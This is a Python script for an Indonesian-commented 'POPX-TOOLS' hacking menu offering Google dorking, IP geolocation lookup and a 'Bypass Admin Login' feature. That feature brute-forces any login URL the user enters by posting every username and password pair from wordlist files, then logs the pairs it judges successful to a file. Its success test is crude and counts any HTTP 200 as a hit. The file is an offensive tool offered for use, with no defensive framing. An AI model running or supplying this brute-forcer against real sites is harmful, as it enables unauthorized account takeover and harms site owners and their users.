# Author : Xyuraa
import requests
import os
from googlesearch import search

# Warna
x = '\033[0m'
u = '\033[4m'
b = '\033[1;94m' 
g = '\033[0;92m'
y = '\033[0;33m'
w = '\033[0;37m'
r = '\033[0;91m'

# Clear
def clear_screen():
    os.system('clear')

# Banner
def print_banner():
    print(f"""{b}


  ____   ___  ______  __   _____ ___   ___  _     ____  
 |  _ \ / _ \|  _ \ \/ /  |_   _/ _ \ / _ \| |   / ___| 
 | |_) | | | | |_) \  /_____| || | | | | | | |   \___ \ 
 |  __/| |_| |  __//  \_____| || |_| | |_| | |___ ___) |
 |_|    \___/|_|  /_/\_\    |_| \___/ \___/|_____|____/ 
                                                                                                   
			        Author: Xyura01
""")

# Confirm
def confirm_continue():
    print(f"\n{b}Lanjut?{x}")
    print("1) Kembali ke Menu")
    print("0) Keluar")
    pilihan = input(f" {b}Pilih:{x} {y}")
    if pilihan == '1':
        return
    else:
        print(f"{w}Exiting...{x}")
        exit()

# Fitur 1: Dorking
def dorking():
    clear_screen()
    print_banner()
    try:
        dork = input(f" {b}{u}Dork Query{w}:{x} {y}")
        pages = int(input(f" {b}{u}Pages{w}:{x} {y}"))
        delay = int(input(f" {b}{u}Delay{w}:{x} {y}"))
        
        results = []
        total = 0
        for result in search(dork, tld="com", lang="en", num=pages, start=0, stop=None, pause=delay):
            results.append(result)
            total += 1
            if total >= pages:
                break
        
        clear_screen()
        print_banner()
        print(f"{g}Hasil Dorking:\n{x}")
        for i, res in enumerate(results):
            print(f"{w}{i+1}) {g}{res}")
            with open('results.txt', 'a') as f:
                f.write(f"{res}\n")

        print(f"\n{w}Saved to: {g}results.txt")
        confirm_continue()

    except ValueError:
        exit(f"{r}Input error! Please enter valid numbers.")
    except KeyboardInterrupt:
        exit(f"\n{r}Interrupted by user. Exiting...{x}")

# Fitur 2: IP Lookup
def ip_lookup():
    clear_screen()
    print_banner()
    try:
        ip = input(f" {b}{u}Enter IP Address{w}:{x} {y}")
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()

        clear_screen()
        print_banner()

        if data["status"] == "success":
            print(f"\n{g}IP Lookup Result:\n{x}")
            print(f"{w}IP       : {g}{data['query']}")
            print(f"{w}Country  : {g}{data['country']}")
            print(f"{w}Region   : {g}{data['regionName']}")
            print(f"{w}City     : {g}{data['city']}")
            print(f"{w}ZIP Code : {g}{data['zip']}")
            print(f"{w}ISP      : {g}{data['isp']}")
            print(f"{w}Org      : {g}{data['org']}")
            print(f"{w}Timezone : {g}{data['timezone']}")
        else:
            print(f"{r}Error: {data['message']}")
        confirm_continue()
    except KeyboardInterrupt:
        exit(f"\n{r}Interrupted by user. Exiting...{x}")
    except Exception as e:
        print(f"{r}Failed to fetch IP info: {e}")
        confirm_continue()

# Fitur 3: Bypass Login
def bypass_admin_login():
    clear_screen()
    print_banner()
    try:
        target_url = input(f" {b}{u}Masukkan URL Login{w}:{x} {y}")
        print()

        try:
            # Baca username dari file username.txt
            with open("username.txt", "r") as f:
                usernames = [line.strip() for line in f if line.strip()]
            
            # Baca password dari file password.txt
            with open("password.txt", "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"{r}File username.txt atau password.txt tidak ditemukan!")
            return confirm_continue()

        success = []
        clear_screen()
        print_banner()
        print(f"{g}Proses login...\n{x}")
        
        # Kombinasikan semua username dengan semua password
        for user in usernames:
            for passwd in passwords:
                payload = {"username": user, "password": passwd}
                try:
                    res = requests.post(target_url, data=payload, timeout=5)
                    if "dashboard" in res.text.lower() or res.status_code in [200, 302]:
                        print(f"{g}[BERHASIL]{x} {user}:{passwd}")
                        success.append(f"{user}:{passwd}")
                        with open("bypass_success.txt", "a") as f:
                            f.write(f"{user}:{passwd}\n")
                    else:
                        print(f"{r}[GAGAL]{x} {user}:{passwd}")
                except:
                    print(f"{r}[ERROR]{x} {user}:{passwd}")
        
        if not success:
            print(f"\n{r}Tidak ada kombinasi yang berhasil.")
        else:
            print(f"\n{g}Berhasil login disimpan ke bypass_success.txt")

        confirm_continue()
    except KeyboardInterrupt:
        exit(f"\n{r}Interrupted by user. Exiting...{x}")

# Menu utama
def main_menu():
    while True:
        clear_screen()
        print_banner()
        print(f"{b}{u}Select a Tool:{w}\n")
        print(f"1) Dorking Tool")
        print(f"2) IP Lookup")
        print(f"3) Bypass Admin Login")
        print(f"0) Exit")
        
        choice = input(f" {b}{u}Your Choice:{w}{x} {y}")
        
        if choice == '1':
            dorking()
        elif choice == '2':
            ip_lookup()
        elif choice == '3':
            bypass_admin_login()
        elif choice == '0':
            print(f"{w}Exiting...{x}")
            exit()
        else:
            print(f"{r}Invalid choice! Please select a valid option.{x}")

# Jalankan
main_menu()
